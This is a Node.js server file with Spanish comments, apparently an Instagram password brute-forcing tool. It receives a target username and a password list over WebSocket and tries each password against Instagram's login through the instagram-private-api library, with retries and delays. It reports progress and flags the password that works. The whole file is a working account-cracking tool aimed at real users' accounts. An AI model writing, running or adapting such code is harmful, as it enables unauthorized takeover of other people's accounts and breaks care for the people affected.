const WebSocket = require('ws');
const express = require('express');
const { IgApiClient } = require('instagram-private-api');
require('dotenv').config();

const app = express();
const server = require('http').createServer(app);
const wss = new WebSocket.Server({ server });

app.use(express.static('public'));

const accessPassword = 'error404notfoundÑ'; // Mantenemos la contraseña de acceso

// Eliminamos todas las funciones relacionadas con bloqueo de IP
console.log(`[DEBUG] Contraseña de acceso: ${accessPassword}`);

const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));

async function testPassword(username, password, retries = 3) {
  const ig = new IgApiClient();
  try {
    ig.state.generateDevice(username);
    await delay(1000);
    await ig.account.login(username, password);
    return { success: true, password };
  } catch (error) {
    if (error.message.includes('challenge_required')) {
      return { success: false, message: 'Contraseña correcta.' };
    }
    if (error.message.includes('two_factor_required')) {
      return { success: false, message: 'Detenido: Se requiere 2FA.' };
    }
    if (retries > 0) {
      await delay(1000);
      return testPassword(username, password, retries - 1);
    }
    return { success: false, message: 'Contraseña incorrecta.' };
  }
}
wss.on('connection', (ws) => {
  console.log('[DEBUG] Nuevo cliente conectado');

  ws.send(JSON.stringify({
    type: 'accessPassword',
    password: accessPassword,
  }));

  ws.on('message', async (message) => {
    const data = JSON.parse(message);

    if (data.type === 'verifyAccessPassword') {
      if (data.password === accessPassword) {
        ws.send(JSON.stringify({ type: 'accessGranted' }));
      } else {
        ws.send(JSON.stringify({ type: 'accessDenied', message: 'Acceso denegado.' }));
      }
    }

    if (data.type === 'startLogin') {
      const { username, passwords } = data;
      let correctPassword = null;

      for (let i = 0; i < passwords.length; i++) {
        const password = passwords[i];
        const result = await testPassword(username, password);

        ws.send(JSON.stringify({
          ...result,
          progress: { current: i + 1, total: passwords.length },
        }));

        if (result.success) {
          correctPassword = result.password;
          break;
        }
      }

      ws.send(JSON.stringify({
        type: 'finished',
        success: !!correctPassword,
        message: correctPassword ? `¡Éxito: ${correctPassword}` : 'Todas fallaron.'
      }));
    }
  });

  ws.on('close', () => {
    console.log('[DEBUG] Cliente desconectado');
  });
});

const PORT = process.env.PORT || 8080;
server.listen(PORT, () => {
  console.log(`[DEBUG] Servidor en http://localhost:${PORT}`);
});
